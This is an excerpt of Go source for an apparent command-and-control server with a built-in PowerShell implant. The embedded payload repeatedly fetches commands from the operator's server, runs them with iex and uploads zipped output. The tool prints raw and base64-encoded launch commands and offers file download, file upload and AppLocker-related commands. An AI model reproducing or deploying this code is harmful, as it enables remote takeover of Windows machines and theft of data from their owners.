...
var (
	...
	sessionInfo    = make(map[int]string, 0)
	currentSession int
	addr           = ""
	currentJob     = ""
	destPath       = ""
...
const (
	HEADER_KEYWORD = "hiid"
	HEADER_HOST    = "cache"
	PAYLOAD        = `& {$i=Get-Random;$h=hostname;$s='{{addr}}/echo';$p='C:\windows\temp\hihi';while ($true){try {rm $p'.*';try{$d=iex((Invoke-WebRequest -Headers @{'` + HEADER_KEYWORD + `' = $i;'` + HEADER_HOST + `' = $h} -UseBasicParsing -Uri $s).Content)}catch{$d=$Error[0]};$d|Out-File -FilePath $p'.txt';Compress-Archive -Path $p'.txt' -DestinationPath $p'.zip' -Force;$b=@{'FileName' = Get-Content($p+'.zip') -Raw};$t=(Invoke-WebRequest -Method POST -UseBasicParsing -Headers @{'` + HEADER_KEYWORD + `' = $i} -Uri $s -InFile $p'.zip')}catch {Start-Sleep -Seconds 5}}}`
	TSHELL_COMMAND = "/"
)

func getId(r *http.Request) int {
	id, _ := strconv.Atoi(r.Header.Get(HEADER_KEYWORD))
	return id
}
...
func echo(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		...
		if !found {
			...
			sessionInfo[id] = fmt.Sprintf("%s\t%s", r.RemoteAddr, r.Header.Get(HEADER_HOST))
		}
...
func printHelp() {
	fmt.Println(TSHELL_COMMAND + "<option>")
...
func tshell(cmd string) {
	...
	case "payload":
		newPayload := strings.Replace(PAYLOAD, `{{addr}}`, "http://"+addr, 1)
		fmt.Println("=======Raw Command=======")
		fmt.Printf("powershell -Command \"%s\"\n", newPayload)
		fmt.Println("=======Encoded Command=======")
		fmt.Printf("powershell -EncodedCommand \"%s\"\n", base64Utf16le(newPayload))
	case "session":
		if len(agrs) < 1 {
	...
	case "download":
		...
		cmd_download := `Invoke-RestMethod -Headers @{'` + HEADER_KEYWORD + `' = $i} -UseBasicParsing -Uri http://` + addr + `/recv/` + newId + ` -Method Post -InFile ` + remotePath
	...
	case "upload":
		...
		destPath = localPath
		cmd_download := `Invoke-WebRequest -Headers @{'` + HEADER_KEYWORD + `' = $i} -UseBasicParsing -Uri http://` + addr + `/send/` + newId + ` -Method Post -OutFile ` + remotePath
		sendCommand(cmd_download)
	case "applocker":
		if len(agrs) < 1 {
